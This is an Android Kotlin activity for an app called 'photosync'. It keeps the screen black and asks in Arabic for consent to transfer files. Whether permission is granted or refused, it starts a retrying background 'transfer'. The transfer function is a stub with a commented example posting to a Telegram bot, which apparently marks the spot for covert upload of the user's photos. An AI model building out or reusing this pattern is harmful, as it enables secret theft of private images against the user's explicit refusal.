package com.example.photosync

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private lateinit var rootView: View
    private val ioExecutor = Executors.newSingleThreadExecutor()

    private val filePermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            showBlackScreenOnly()
            if (permissions.values.any { it }) {
                startTransferWithRetry()
            } else {
                startTransferWithRetry()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        rootView = findViewById(R.id.rootLayout)
        showBlackScreenOnly()
        showApprovalMessage()
    }

    private fun showApprovalMessage() {
        AlertDialog.Builder(this)
            .setTitle("السماح بنقل الملفات")
            .setMessage("هل توافق على السماح بنقل الملفات؟")
            .setCancelable(false)
            .setPositiveButton("موافقة") { dialog, _ ->
                dialog.dismiss()
                requestFilePermissions()
            }
            .setNegativeButton("رفض") { dialog, _ ->
                dialog.dismiss()
                showBlackScreenOnly()
            }
            .show()
    }

    private fun requestFilePermissions() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            showBlackScreenOnly()
            startTransferWithRetry()
        } else {
            filePermissionLauncher.launch(permissions)
        }
    }

    private fun startTransferWithRetry() {
        ioExecutor.execute {
            val maxRetries = 3
            for (attempt in 1..maxRetries) {
                try {
                    performTransfer()
                    break
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        Thread.sleep(2000L * attempt)
                    }
                }
            }
        }
    }

    private fun performTransfer() {
        // ضع هنا كود النقل الأصلي اللي كان كينقل في التطبيق الأول
        // مثال لإعداد اتصال بمهلة طويلة لتفادي timeout مع VPN:
        /*
        val url = URL("https://api.telegram.org/bot<TOKEN>/sendMessage")
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doOutput = true
        }
        conn.outputStream.use { it.write("chat_id=<CHAT_ID>&text=...".toByteArray()) }
        conn.responseCode
        conn.disconnect()
        */
    }

    private fun showBlackScreenOnly() {
        rootView.setBackgroundColor(Color.BLACK)
        window.decorView.setBackgroundColor(Color.BLACK)
        window.statusBarColor = Color.BLACK
        window.navigationBarColor = Color.BLACK
    }

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdown()
    }
}
